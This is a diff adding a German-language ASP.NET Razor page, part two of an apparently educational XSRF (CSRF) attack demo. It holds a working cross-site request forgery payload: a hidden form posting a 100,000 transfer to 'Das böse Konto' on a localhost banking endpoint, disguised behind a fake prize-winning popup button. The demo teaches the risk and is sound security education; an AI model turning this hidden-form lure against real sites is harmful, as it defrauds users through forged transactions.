@@ -1,0 +1,63 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<h1>XSRF-Attacke-Demo Teil 2</h1>
+<p>
+    <i>Diese Seite ist Teil 2 eines Demos, das auf die Risiken einer XSRF-Attacke aufmerksam machen soll. Um das Demo korrekt zu durchlaufen, bitte
+    zunächst den Instruktionen auf <a href="https://localhost:44387/">dieser</a> Seite folgen.</i>
+</p>
+<p>
+    Auf dieser Seite ist es möglich, eine Idee davon zu bekommen, welcher Schaden mit einer erfolgreichen XSRF-Attacke zu verursachen ist.
+    Es handelt sich um folgendes Szenario: Ein Benutzer führt legitim eine Banküberweisung durch, vergisst sich auszuloggen, und landet schließlich auf einer
+    bösartigen Seite, wie dieser hier. Plötzlich springt dem Benutzer ein <a style="color:Highlight" onclick="enablePopup()" onmouseover="enablePopup()">PopUp</a> in die Augen.
+</p>
+
+<form class="popup" action="https://localhost:44387/Home/DoSomethingUnsafe" method="post">
+    <input type="number" hidden name="Amount" value="100000" />
+    <input type="text" hidden name="DestinationBankAccount" value="Das böse Konto" />
+    <input type="text" hidden name="RedirectionMessage" value="Ooops. Nun ist es passiert. Weil Sie sich nicht ausgeloggt haben, und die Applikation keinen internen
+           Schutz gegen XSRF bietet, konnte der Angreifer ihnen eine beträchtliche Summe Geld entwenden. Moderne Bankapplikationen bieten glücklicherweise sehr gute Sicherheit
+           gegen diese Art von Angriff, jedoch ist davon auszugehen, dass nicht alle sicherheitskritischen Systeme gegen diese Art des Angriffs gut genug geschützt sind." />
+    <input id="myPopup" type="submit" class="popuptext" style="visibility:hidden" value="SIE HABEN GEWONNEN!!!!!!!! KLICKEN SIE JETZT HIER UM IHREN PREIS ABZUHOLEN!!!!"/>
+</form>
+
+<p>In einem unachtsamen Moment, oder weil dem Benutzer nicht klar ist, dass das Netz ein Ort vieler potentieller Gefahren sein kann, wird auf das PopUp geklickt.
+    Durch klicken des PopUps, wird im Hintergrund ein Form generiert und an die zuvor benutzte Bankapplikation geschickt, um eine Überweisung durchzuführen.
+    Diesmal jedoch nicht an ein vom Benutzer gewähltes Konto in Höhe eines vom Benutzer definierten Betrages.
+    </p>
+
+<script>
+    function enablePopup() {
+        document.getElementById("myPopup").style.visibility = "visible";
+    }
+</script>
+
+<style>
+    .button {
+        background-color: cadetblue;
+        color: white;
+        height:30px;
+        width:150px;
+        font: bold;
+        text-align: center;
+    }
+
+    .popup {
+        position: relative;
+    }
+
+        .popup .popuptext {
+            visibility: visible;
+            width: auto;
+            height:200px;
+            background-color: black;
+            color: red;
+            text-align: center;
+            border-radius: 5px;
+            padding: 8px 10px;
+            z-index: 1;
+            font:bolder;
+            font-size:x-large
+        }
+</style>
